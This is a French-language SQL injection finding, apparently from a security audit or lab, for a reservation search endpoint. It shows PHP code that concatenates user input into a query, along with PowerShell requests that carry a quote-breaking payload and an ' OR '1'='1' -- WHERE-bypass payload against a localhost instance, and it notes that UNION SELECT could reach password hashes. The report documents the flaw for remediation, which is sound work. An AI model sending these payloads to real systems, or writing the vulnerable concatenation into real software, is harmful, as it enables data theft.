# Preuve — SQL Injection

## Endpoint concerné
`GET /api/reservations/search?q={payload}`

## Description
L'endpoint de recherche construit sa requête SQL en concaténant directement
le paramètre `q` fourni par l'utilisateur, sans requête préparée ni
échappement, permettant l'injection de code SQL arbitraire.

## Cause technique
Dans `app/src/Controller/SearchController.php` :
```php
$query = $request->query->get('q', '');
$sql = "SELECT * FROM reservation WHERE resource_name LIKE '%" . $query . "%'";
$results = $connection->fetchAllAssociative($sql);
```
Aucune requête paramétrée (`?` ou `:param`) n'est utilisée : l'entrée
utilisateur est directement concaténée dans la chaîne SQL.

## Exploitation

### Test 1 — requête légitime (comportement normal)
```powershell
Invoke-RestMethod -Uri "http://localhost:8086/api/reservations/search?q=coworking" -Method Get -Headers @{ Authorization = "Bearer $token" }
```
Retourne les réservations dont le nom contient "coworking" (comportement attendu).

### Test 2 — payload cassant la syntaxe SQL (preuve d'injection)
```powershell
Invoke-RestMethod -Uri "http://localhost:8086/api/reservations/search?q=xyz'" -Method Get -Headers @{ Authorization = "Bearer $token" }
```

**Réponse serveur (erreur 500) :**
```
Doctrine\DBAL\Exception\SyntaxErrorException: An exception occurred while
executing a query: SQLSTATE[42601]: Syntax error: 7 ERROR:  unterminated
quoted string at or near "'"
```
→ Preuve directe que l'entrée utilisateur est interprétée comme du SQL, et
que le message d'erreur PostgreSQL brut est renvoyé (fuite d'information
technique en bonus).

### Test 3 — payload de contournement de la clause WHERE
```powershell
Invoke-RestMethod -Uri "http://localhost:8086/api/reservations/search?q=xyz%25' OR '1'='1' --" -Method Get -Headers @{ Authorization = "Bearer $token" }
```

**Payload décodé :** `xyz%' OR '1'='1' --`

**Requête SQL résultante :**
```sql
SELECT * FROM reservation WHERE resource_name LIKE '%xyz%' OR '1'='1' --%'
```

**Réponse serveur (200 OK) :** toutes les réservations sont retournées,
y compris celles n'ayant aucun rapport avec "xyz" — preuve que la clause
`WHERE` a été neutralisée par l'injection.

## Impact
- Technique : lecture arbitraire de données via injection, message d'erreur
  SQL exposé, et avec un payload plus poussé (`UNION SELECT`), possibilité
  d'exfiltrer des données d'autres tables (ex : table `user` et ses hash de
  mots de passe).
- Métier : fuite potentielle de l'ensemble des données de réservation et des
  comptes utilisateurs.

## Criticité
**Critique** — injection SQL exploitable sans restriction, sur un endpoint
accessible à tout utilisateur authentifié, avec risque d'exfiltration de
données sensibles (mots de passe hashés).

## Captures d'écran

